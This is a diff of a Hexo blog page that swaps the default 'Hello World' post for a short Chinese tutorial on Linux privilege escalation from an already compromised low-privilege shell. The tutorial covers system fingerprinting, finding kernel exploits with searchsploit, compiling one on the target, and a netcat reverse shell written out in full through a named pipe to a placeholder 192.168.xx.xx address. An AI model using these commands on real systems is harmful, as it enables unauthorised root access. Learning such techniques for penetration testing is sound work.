@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="tao1tao.github.io">
-  <title>Hello World | Taotao&#39; Blog</title>
+  <title>Linux 系统提权 | Taotao&#39; Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="前提： 已经拿到低权shell 被入侵的机器上面有nc，python，perl等linux非常常见的工具 有权限上传文件和下载文件 内核漏洞提权 内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集。 第一步 查看linux版本信息 cat /etc/issuecat /etc/*-release 查看内核版本 uname -a  这里我找了台机">
 <meta name="keywords" content="渗透测试,游戏,生活感悟">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="tao1tao.github.io/2017/09/11/hello-world/index.html">
+<meta property="og:title" content="Linux 系统提权">
+<meta property="og:url" content="tao1tao.github.io/2017/09/11/Linux-系统提权/index.html">
 <meta property="og:site_name" content="Taotao&#39; Blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta property="og:updated_time" content="2017-09-11T02:16:13.501Z">
+<meta property="og:description" content="前提： 已经拿到低权shell 被入侵的机器上面有nc，python，perl等linux非常常见的工具 有权限上传文件和下载文件 内核漏洞提权 内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集。 第一步 查看linux版本信息 cat /etc/issuecat /etc/*-release 查看内核版本 uname -a  这里我找了台机">
+<meta property="og:updated_time" content="2017-09-11T06:41:02.576Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="Linux 系统提权">
+<meta name="twitter:description" content="前提： 已经拿到低权shell 被入侵的机器上面有nc，python，perl等linux非常常见的工具 有权限上传文件和下载文件 内核漏洞提权 内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集。 第一步 查看linux版本信息 cat /etc/issuecat /etc/*-release 查看内核版本 uname -a  这里我找了台机">
   
   
     <link rel="icon" href="/assets/img/favicon.ico">
@@ -142,35 +142,59 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Linux-系统提权" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      Linux 系统提权
     </h1>
   
 
         
-        <a href="/2017/09/11/hello-world/" class="archive-article-date">
-  	<time datetime="2017-09-11T02:16:13.501Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-11</time>
+        <a href="/2017/09/11/Linux-系统提权/" class="archive-article-date">
+  	<time datetime="2017-09-11T06:37:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <p>前提：</p>
+<p>已经拿到低权shell</p>
+<p>被入侵的机器上面有nc，python，perl等linux非常常见的工具</p>
+<p>有权限上传文件和下载文件</p>
+<p>内核漏洞提权</p>
+<p>内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集。</p>
+<p>第一步</p>
+<p>查看linux版本信息</p>
+<p>cat /etc/issuecat /etc/*-release</p>
+<p>查看内核版本</p>
+<p>uname -a </p>
+<p>这里我找了台机器测试：</p>
+<p>#uname -aLinux xxxxx 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux#cat /etc/*-releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=10.04DISTRIB_CODENAME=lucidDISTRIB_DESCRIPTION=”Ubuntu 10.04 LTS”</p>
+<p>这样，我们就得到了系统的内核版本（2.6.32-21 pae），cpu架构（i686），和发行版（ubuntu 10.04）</p>
+<p>可以开始搜索了</p>
+<p>大多内核漏洞通过内核版本能很快查到</p>
+<p>第二步</p>
+<p>用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码</p>
+<p>searchspoit linux 2.6 ubuntu priv esc</p>
+<p>找到需要的.c文件</p>
+<p>第三步</p>
+<p>将.c文件上传到获得shell的机器上</p>
+<p>第四步</p>
+<p>在webshell的机器上编译.c 文件</p>
+<p>gcc hello.c -o hello</p>
+<p>第五步</p>
+<p>使用一个可交互的shell，这里使用的nc反弹</p>
+<p>攻击方执行：nc -lnvp 4430</p>
+<p>被攻击方执行：mknod /tmp/backpipe p</p>
+<pre><code>/bin/sh 0&lt;/tmp/backpipe | nc 192.168.xx.xx 4430 1&gt;/tmp/backpipe
+</code></pre><p>第六步</p>
+<p>执行.c文件，提升权限  ./hello</p>
+<p>id 查看当前权限</p>
 
       
 
@@ -229,7 +253,7 @@ var _hmt = _hmt || [];
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http:tao1tao.github.io/2017/09/11/hello-world/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:tao1tao.github.io/2017/09/11/Linux-系统提权/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -243,15 +267,11 @@ var _hmt = _hmt || [];
   
 <nav id="article-nav">
   
-    <a href="/2017/09/11/Linux-系统提权/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Linux 系统提权
-        
-      </div>
-    </a>
   
+    <a href="/2017/09/11/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hello World</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
